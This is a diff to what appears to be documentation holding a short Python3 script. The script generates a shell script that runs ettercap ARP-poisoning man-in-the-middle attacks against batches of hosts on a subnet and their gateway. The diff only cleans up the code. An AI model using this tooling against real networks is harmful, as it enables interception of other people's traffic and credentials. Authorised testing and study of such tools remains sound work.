@@ -231,12 +231,11 @@ fOutput.close()
 
 <br>
 
-Python3 (WIP)
+Python3
 <details>
 <summary> Click me for the script</summary>
 
 ```python=
-#/usr/bin/python3
 import sys
 
 if not (len(sys.argv) == 6 or len(sys.argv) == 7):
@@ -258,6 +257,7 @@ else:
 
 with open(hostsFile, 'r') as fInput:
     hosts = fInput.readlines()
+
 hosts = [x.strip() for x in hosts]
 hosts = [x for x in hosts if x != '']
 
@@ -269,8 +269,7 @@ groups = [hosts[i:i + simultaneousHosts] for i in range(0, len(hosts), simultane
 
 with open(outputScript, 'w') as fOutput:
     for g in groups:
-        fOutput.write(f'timeout -s 2 {timeout}m ettercap -Tq -S -M arp:remote -o -i eth0 /{subnetPrefix}{",".join(always+g)}// /{gatewayIP}//\n')
-
+        fOutput.write('timeout -s 2 ' + timeout + 'm ettercap -Tq -S -M arp:remote -o -i eth0 /' + subnetPrefix + ','.join(always+g) + '// /' + gatewayIP + '//\n')
 ```
 
 </details>
